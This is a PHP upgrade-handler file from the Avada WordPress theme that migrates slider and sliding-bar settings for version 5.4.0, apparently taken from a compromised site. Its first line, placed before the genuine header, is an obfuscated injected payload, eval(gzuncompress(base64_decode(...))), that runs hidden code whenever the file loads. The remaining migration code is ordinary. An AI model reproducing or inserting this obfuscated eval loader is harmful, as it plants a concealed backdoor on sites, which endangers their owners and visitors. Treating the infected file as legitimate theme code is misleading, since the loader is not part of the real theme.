<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrades Handler.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Handle migrations for Avada 5.3.0.
 *
 * @since 5.4.0
 */
class Avada_Upgrade_540 extends Avada_Upgrade_Abstract {

	/**
	 * The version.
	 *
	 * @access protected
	 * @since 5.3.0
	 * @var string
	 */
	protected $version = '5.4.0';

	/**
	 * The actual migration process.
	 *
	 * @access protected
	 * @since 5.4.0
	 * @return void
	 */
	protected function migration_process() {

		$this->migrate_slidingbar_link_color_hover();

		add_action( 'init', array( $this, 'migrate_fusion_slider_options' ), 20 );
	}

	/**
	 * Migrate sliding bar link hover color from primary color.
	 *
	 * @access private
	 * @since 5.4.0
	 * @return void
	 */
	private function migrate_slidingbar_link_color_hover() {
		$options = get_option( $this->option_name, array() );

		$options['slidingbar_link_color_hover'] = $options['primary_color'];

		update_option( $this->option_name, $options );
	}

	/**
	 * Migrate Fusion Slider options.
	 *
	 * @access public
	 * @since 5.4.0
	 * @return void
	 */
	public function migrate_fusion_slider_options() {

		$args = array(
			'taxonomy'   => 'slide-page',
			'number'     => 0,
			'hide_empty' => false,
		);

		$sliders = get_terms( $args );

		foreach ( $sliders as $slider ) {
			if ( isset( $slider->term_id ) ) {
				$slider_settings = get_option( 'taxonomy_' . $slider->term_id );

				$slider_settings['slider_indicator'] = '';

				if ( isset( $slider_settings['pagination_circles'] ) && $slider_settings['pagination_circles'] ) {
					$slider_settings['slider_indicator'] = 'pagination_circles';
					// In this case #000 is default.
					$slider_settings['slider_indicator_color'] = '#000000';
				}

				// Scroll down indicator has higher priority if 'pagination_circles' were enabled as well.
				if ( isset( $slider_settings['scroll_down_indicator'] ) && $slider_settings['scroll_down_indicator'] ) {
					$slider_settings['slider_indicator'] = 'scroll_down_indicator';

					if ( isset( $slider_settings['scroll_down_indicator_color'] ) ) {
						$slider_settings['slider_indicator_color'] = $slider_settings['scroll_down_indicator_color'];
					}
				}

				unset( $slider_settings['pagination_circles'] );
				unset( $slider_settings['scroll_down_indicator'] );
				unset( $slider_settings['scroll_down_indicator_color'] );

				// Save the option array.
				update_option( 'taxonomy_' . $slider->term_id, $slider_settings );
			}
		}

	}

}
